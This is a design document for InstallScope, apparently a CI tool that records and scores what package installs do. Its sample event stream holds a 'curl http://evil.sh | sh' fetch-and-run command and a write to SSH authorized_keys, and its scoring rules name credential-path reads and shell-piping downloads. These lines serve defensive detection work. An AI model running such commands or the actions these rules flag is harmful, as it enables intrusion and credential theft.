# Architecture — InstallScope

## 1. System components
```
┌────────────┐   lockfile diff    ┌───────────────┐
│ GitHub PR  │───────────────────▶│ GitHub Action │
└────────────┘                    └──────┬────────┘
                                         │ spins recorder on runner (sudo ok)
                                  ┌──────▼────────┐
                                  │ installscope  │  backends: aya (eBPF) │ strace
                                  │ record -- cmd │  → JSONL event stream + heartbeat
                                  └──────┬────────┘
                                  ┌──────▼────────┐
                                  │ rules engine  │  deterministic, no LLM
                                  └──────┬────────┘
                          ┌──────────────┼───────────────────┐
                   ┌──────▼─────┐ ┌──────▼──────┐ ┌──────────▼─────────┐
                   │ PR comment │ │ SARIF 2.1.0 │ │ HTML artifact      │
                   │ (1 score + │ │ (GH code    │ │ (self-contained,   │
                   │ 3 bullets) │ │  scanning)  │ │  shareable)        │
                   └────────────┘ └─────────────┘ └────────────────────┘
                                         │
                                  ┌──────▼─────────┐
                                  │ snapshot pushed│ content-addressed (sha256/zstd)
                                  │ to registry v0 │ → version-diff engine
                                  └────────────────┘
```

## 2. Tech stack (locked)
| Layer | Choice | Why |
|---|---|---|
| Core recorder | Rust | aya lives here; one binary, no runtime deps on user machines |
| eBPF backend | `aya` (pure Rust) | v1.1; **gated on Gate G1** |
| eBPF fallback | `libbpf-rs` | only if aya fails on runners; decision must be logged |
| MVP backend | `strace -f -ff` parse | ships in v1.0 regardless; de-risks everything |
| Manifest/format | `serde`, `serde_json`, `serde_yaml` (config) | JSONL event stream |
| CLI | `clap` | — |
| Errors | `thiserror` (lib) + `anyhow` (CLI boundary only) | typed in core, ergonomic at edge |
| Logging | `tracing` | recorder heartbeat + forensic logs |
| Compression | `zstd` | snapshot blobs |
| Signing | `sigstore`/`minisign` (Phase 4 +) | snapshots must be verifiable |
| Action glue | bash + `gh api` | no heavyweight Action framework |
| **Banned in core** | any LLM SDK, any cloud SDK, any telemetry | evidence tool spies on nobody — irony is fatal |

## 3. Event stream schema (JSONL, versioned `schema_version: 1`)
```json
{"ts_ns":1719,"op":"fs_write","path":"/home/runner/.ssh/authorized_keys","backend":"strace"}
{"ts_ns":1719,"op":"net_connect","host":"telemetry.example","ip":"1.2.3.4","port":443,"backend":"aya"}
{"ts_ns":1719,"op":"proc_spawn","cmd":"curl http://evil.sh | sh","backend":"strace"}
{"ts_ns":1719,"op":"heartbeat","phase":"postinstall"}
{"ts_ns":1719,"op":"session_end","complete":true}
```

## 4. Scoring rules (deterministic v0.1)
| Op | Default severity |
|---|---|
| write outside project + cache + package-manager dirs | critical (×40) |
| connect to non-registry domain during install | high (×15) |
| spawn child process (esp. curl/wget/sh chain) | high ×15 / critical if pipes to shell |
| read env / credentials paths (~/.aws, ~/.ssh, .npmrc) | high (×15) |
| DNS to newly-registered/lookalike domain | medium (×5) |

Rules live in a versioned YAML file (public, PR-able — the community rule catalog).

## 5. Repository structure (monorepo)
```
installscope/
├── core/                    # event model, rules engine, scoring
│   └── src/{events.rs, rules.rs, score.rs, error.rs}
├── recorder/
│   ├── strace/              # v1.0 backend
│   ├── aya/                 # v1.1 backend (ebpf/ + userspace/) — behind G1 gate
│   └── heartbeat.rs
├── cli/                     # installscope binary (record, report, diff, push)
├── action/                  # GitHub Action: lockfile-diff trigger, runs recorder,
│   └── src/lockfile.ts      #   posts comment, uploads SARIF+HTML
├── report/
│   ├── sarif.rs             # SARIF 2.1.0 emitter
│   └── html/                # self-contained HTML template (inline CSS/JS)
├── registry/                # v0: content-addressed snapshots + JSONL index + diff engine
├── corpus/                  # demo dataset — recordings commit IN THIS REPO
├── rules/                   # public rule catalog (YAML)
├── docs/                    # this dev kit, blog drafts, neighbor table
└── .github/workflows/       # self-hosting: we run InstallScope on InstallScope
```

## 6. Snapshot registry v0 (deliberately boring)
- Blob store: GitHub Releases on an aux branch/repo, or any S3-compatible bucket later.
- Addressing: `sha256(zstd(events))` → JSONL index `{pkg, version, digest, recorded_at, agent_v}`.
- **Version-diff engine (the moat):** `installscope diff <pkg> 1.2.3 1.2.4` → human-readable
  "what changed behaviorally" report. First mover owns this dataset.
- Day-one corpus: backfilled **top ~200 npm packages × last ~5 versions each** (version history,
  not just current — the diff moat requires it), recorded with **clean-VM-per-package** harness.

## 7. CI environment notes
- `ubuntu-latest` runners: passwordless sudo ✓, BTF at `/sys/kernel/btf/vmlinux` ✓ (verify in G1 anyway).
- eBPF load needs CAP_BPF/CAP_PERFMON — run with sudo on runner; document loudly.
- strace mode needs no privileges beyond ptrace — keep as universal fallback forever.

## 8. Failure philosophy
1. Recording is tamper-evident to its own users: heartbeat + session_end + agent version stamped inline.
2. Missing evidence = `PARTIAL`, never a clean score.
3. Product never has network authority: CLI uploads only what the user saw in their report first.
